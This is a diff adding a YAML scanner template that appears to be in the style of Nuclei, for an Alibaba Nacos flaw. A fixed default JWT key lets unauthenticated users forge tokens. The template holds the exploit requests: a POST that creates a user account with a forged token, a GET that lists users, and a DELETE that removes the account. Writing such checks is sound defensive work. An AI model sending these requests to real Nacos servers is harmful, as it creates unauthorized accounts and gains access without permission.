@@ -1,0 +1,26 @@
+id: nacos-create-user
+brief:
+    title: Alibaba Nacos - Unauthorized Account Creation
+    by: SleepingBag945
+    level: high
+    about: Nacos uses a fixed JWT token key to authenticate users in the default configuration. Since Nacos is an open source project, the key is publicly known, so unauthorized attackers can use this fixed k...
+    label:
+        - misconfig
+        - nacos
+        - unauth
+        - bypass
+        - instrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/nacos/v1/auth/users/?username={{randstr_1}}&password={{randstr_2}}&accessToken={{token}}'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=9&search=blur&accessToken={{token}}'
+      signs: []
+    - verb: DELETE
+      to:
+        - '{{BaseURL}}/nacos/v1/auth/users/?username={{randstr_1}}&accessToken={{token}}'
+      signs: []
